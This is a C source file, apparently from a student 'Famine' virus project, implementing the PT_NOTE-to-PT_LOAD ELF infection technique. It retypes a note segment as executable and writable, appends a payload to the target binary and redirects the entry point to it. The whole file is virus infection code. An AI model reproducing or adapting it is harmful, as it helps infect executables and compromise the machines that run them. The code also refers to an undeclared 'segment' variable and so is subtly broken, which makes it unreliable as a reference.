/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pt_note_to_pt_load_infection.c                     :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mabouce <ma.sithis@gmail.com>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/09/23 18:04:56 by mabouce           #+#    #+#             */
/*   Updated: 2021/09/23 18:04:56 by mabouce          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"

void update_note_segment(t_famine *famine)
{
    const size_t base = famine->p_data.p_vaddr + famine->p_data.p_memsz;
    const size_t add_padding = base % famine->p_data.p_align;

    famine->p_note.p_vaddr = base + (famine->p_data.p_align - add_padding);
    famine->p_note.p_paddr = famine->p_note.p_vaddr;
    famine->p_note.p_offset = base - add_padding;

    famine->p_note.p_filesz = famine->payload_size;
    famine->p_note.p_memsz = famine->payload_size;

    famine->p_note.p_type = PT_LOAD;
    famine->p_note.p_flags = (PF_X | PF_W | PF_R);
    famine->p_note.p_align = famine->p_data.p_align;
}

void pt_note_to_pt_load_infection(t_famine *famine)
{
    bool p_data_found = false;
    bool p_note_found = false;

    if (DEBUG == true)
        printf("Applying pt_note_to_pt_load infection.\n");
    // Create the output file
    if (!(famine->infected_file = malloc(famine->binary_data_size + famine->payload_size)))
    {
        error(ERROR_MALLOC, famine);
    }
    famine->infected_file_size = famine->binary_data_size + famine->payload_size;

    for (size_t i = 0; i < famine->ehdr->e_phnum; i++)
    {
        printf("segment offset = %lu\n", segment[0].p_offset);
        if (is_data_segment(famine->phdr[i]) == true)
        {
            printf("data\n");
            p_data_found = true;
            famine->p_data = segment;
            famine->p_data_end_offset = famine->p_data.p_offset + famine->p_data.p_filesz;
        }
        if (is_note_segment(famine->phdr[i]) == true && !p_note_found)
        {
            famine->phdr[i].p_type = PT_LOAD;
            p_note_found = true;
            famine->p_note = segment;
        }
    }

    if (!p_note_found || !p_data_found)
    {
        error(ERROR_SECTION_NOT_FOUND, famine);
    }

    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);

    update_note_segment(famine);

    printf("famine->p_note.p_offset %lu\n", famine->p_note.p_offset);

    famine->ehdr->e_entry = famine->p_note.p_vaddr;
    famine->new_entry_point = famine->ehdr->e_entry;

    // Copy until end of original file.
    memcpy(famine->infected_file, famine->mmap_ptr, famine->binary_data_size);
    // Copy payload.
    memcpy(famine->infected_file + famine->binary_data_size, famine->payload_data, famine->payload_size);
}
